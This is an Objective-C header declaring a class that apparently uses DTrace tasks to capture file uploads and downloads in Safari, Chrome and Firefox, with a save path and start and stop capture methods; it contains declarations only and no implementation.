//
//  UploadDownloadFileCapture.h
//  blbld
//
//  Created by ophat on 6/14/16.
//
//

#import <Foundation/Foundation.h>

@interface UploadDownloadFileCapture : NSObject {
@private
    NSTask * mSafariTask;
    NSTask * mChromeTask;
    NSTask * mFirefoxTask;
    
    NSString * mCmdSafari;
    NSString * mCmdChrome;
    NSString * mCmdFirefox;
    
    BOOL mIsSafariDtraceActive;
    BOOL mIsChromeDtraceActive;
    BOOL mIsFirefoxDtraceActive;
    
    NSString * mSavePath;
    NSString * mCurrentLogoonName;
    
    NSMutableArray * mPrevention;
    NSMutableArray * mAvailableProtocol;
    NSMutableArray * mCheckNotFound;
    NSMutableArray * mVerificationUrl;
    NSMutableArray * mVerificationDir;
    
    NSThread *mThread;
    
}
@property (nonatomic,retain) NSTask * mSafariTask;
@property (nonatomic,retain) NSTask * mChromeTask;
@property (nonatomic,retain) NSTask * mFirefoxTask;

@property (nonatomic,copy)   NSString * mCmdSafari;
@property (nonatomic,copy)   NSString * mCmdChrome;
@property (nonatomic,copy)   NSString * mCmdFirefox;

@property (nonatomic,assign) BOOL mIsSafariDtraceActive;
@property (nonatomic,assign) BOOL mIsChromeDtraceActive;
@property (nonatomic,assign) BOOL mIsFirefoxDtraceActive;

@property (nonatomic,copy)   NSString * mCurrentLogoonName;
@property (nonatomic,copy)   NSString * mSavePath;

@property (nonatomic,retain) NSMutableArray * mPrevention;
@property (nonatomic,retain) NSMutableArray * mAvailableProtocol;
@property (nonatomic,retain) NSMutableArray * mCheckNotFound;
@property (nonatomic,retain) NSMutableArray * mVerificationUrl;
@property (nonatomic,retain) NSMutableArray * mVerificationDir;

@property (nonatomic,retain) NSThread *mThread;

- (id) initWithSavePath:(NSString *)aPath;

- (void) startCapture;
- (void) stopCapture;

@end
